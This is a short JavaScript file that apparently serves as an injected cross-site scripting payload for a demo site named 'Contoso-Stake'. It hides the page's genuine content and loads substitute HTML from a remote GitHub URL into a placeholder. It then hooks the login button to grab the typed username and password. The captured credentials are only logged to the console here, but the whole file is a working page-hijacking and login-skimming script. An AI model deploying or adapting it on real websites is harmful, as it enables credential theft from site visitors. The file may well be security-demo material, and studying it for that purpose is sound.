// Hide initial content
$(".row, .subheader").css("display", "none");

// Add place holder
var place_holder = document.createElement('div');
place_holder.className = "place_holder";
$("nav").after(place_holder);

function magic(username, password) {
    console.log("username is: " + username);
    console.log("password is: " + password);
}


$(window).on('load', function() {
    // Remove all unwanted content
    $(".row").remove();
    $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xxs_ph.html", hook);

    console.log("done");
});

var hook = function() {
    console.log("ready");
    $('#doLogin_0').click(function() {
        console.log("clicked");
        magic($('#doLogin_username').val(), $('#doLogin_password').val());
    });
}